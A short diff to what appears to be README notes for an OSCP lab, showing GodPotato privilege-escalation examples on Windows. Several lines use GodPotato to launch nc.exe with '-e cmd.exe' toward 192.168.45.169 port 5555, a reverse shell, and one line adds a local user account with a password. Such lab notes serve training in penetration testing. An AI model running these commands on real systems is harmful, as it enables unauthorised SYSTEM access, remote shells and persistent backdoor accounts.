@@ -32,9 +32,9 @@ Download the binaries from the release folder at: [https://github.com/amandagugl
 Example of privilege escalation in oscp-relia:
 
 ```
-.\GodPotato-NET4.exe -cmd ".\nc.exe 192.168.45.169 5555 -e cmd.exe"
-.\GodPotato-NET35.exe -cmd ".\nc.exe 192.168.45.169 5555 -e cmd.exe"
-.\GodPotato-NET2.exe -cmd ".\nc.exe 192.168.45.169 5555 -e cmd.exe"
+.\GodPotato-NET4.exe -cmd "C:\Users\XXXXX\nc.exe 192.168.45.169 5555 -e cmd.exe"
+.\GodPotato-NET35.exe -cmd "C:\Users\XXXXX\\nc.exe 192.168.45.169 5555 -e cmd.exe"
+.\GodPotato-NET2.exe -cmd "C:\Users\XXXXX\\nc.exe 192.168.45.169 5555 -e cmd.exe"
 
 
 .\GodPotato-NET4.exe  -cmd "net user lala Lalala123 /add"
